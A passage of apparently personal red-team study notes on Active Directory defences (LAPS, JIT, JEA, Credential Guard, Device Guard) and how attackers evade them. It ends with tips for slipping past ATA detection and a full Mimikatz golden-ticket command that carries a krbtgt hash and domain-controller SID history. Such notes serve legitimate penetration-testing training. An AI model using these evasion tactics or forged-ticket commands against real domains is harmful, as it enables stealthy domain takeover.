controls the password change. (Only DA can read the password from a machine acc, even the machine account cannot read(but can write) it but With careful enumeration, it is possible to retrieve which users can access(read) the clear text password providing a list of attractive targets!
• Storage in clear text, transmission is encrypted.
## Just In Time (JIT) administration provides the ability to grant time-bound
administrative access on per-request bases.
• Check out Temporary Group Membership! (Requires Privileged Access
Management Feature to be enabled on the forest level which can't be turned off later)
`Add-ADGroupMember -Identity 'Domain Admins' -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 60)`
JEA (Just Enough Administration) provides role based access control for PowerShell based remote delegated administration.
• With JEA non-admin users can connect remotely to machines for doing
specific administrative tasks.
• For example, we can control the command a user can run and even
restrict parameters which can be used.
• JEA endpoints have PowerShell transcription and logging enabled.
## Credential Guard(bypassed my mimikatz)
It "uses virtualization-based security to isolate secrets so that only
privileges system software can access them".
• Effective in stopping PTH and Over-PTH attacks by restricting access to
NTLM hashes and TGTs. It is not possible to write Kerberos tickets to
memory even if we have credentials.  But,
https://docs.microsoft.com/en-us/windows/access-protection/credential-guard/credential-guard

## Device Guard (WDAC)
 UMCI is something which interferes with most of the lateral movement attacks we
have seen.
• While it depends on the deployment (discussing which will be too lengthy), many
well known application whitelisting bypasses - signed binaries like csc.exe,
MSBuild.exe etc. - are useful for bypassing UMCI as well.
• Check out the LOLBAS project (lolbas-project.github.io/).

# Bypassing ATA:(DONT DOWNGRADE USE AES, COMPLY WITH THE TIME POLICIES, DONT CREATE TICKETS WITH 9999 TIME YOU FOOL)
## ATA, for all its goodness, can be bypassed and avoided.
## The key is to avoid talking to the DC as long as possible and make appear the traffic we generate as attacker normal.
## To bypass DCSync detection, go for users which are whitelisted. Usually, accounts like Sharepoint Administrators and Azure AD Connect PHS account may be whitelisted. 
## If you use invoke-kerberos or rubeus to quickly request TGS for all the SPN's you will get detected
## Also, if we have NTLM hash of a DC, we can extract NTLM hashes of any machine account using netsync
## If we forge a Golden Ticket with SID History of the Domain Controllers group and Enterprise Domain Controllers Group, there are less chances of detection by ATA:
`Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'`
